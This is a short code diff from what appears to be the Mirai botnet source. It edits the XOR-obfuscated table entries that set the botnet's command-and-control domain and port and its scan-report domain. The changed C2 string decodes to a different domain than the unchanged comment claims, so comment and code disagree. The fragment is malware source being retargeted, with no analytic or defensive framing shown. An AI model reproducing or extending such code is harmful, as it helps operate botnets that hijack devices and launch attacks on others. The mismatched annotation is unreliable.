@@ -15,7 +15,7 @@ struct table_value table[TABLE_MAX_KEYS];
 
 void table_init(void)
 {
-    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22", 30); // cnc.mirai.com //PATCHED
+    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x40\x41\x22", 30); // cnc.mirai.com //PATCHED
     add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23
 
     add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22", 29); // report.mirai.com //PATCHED
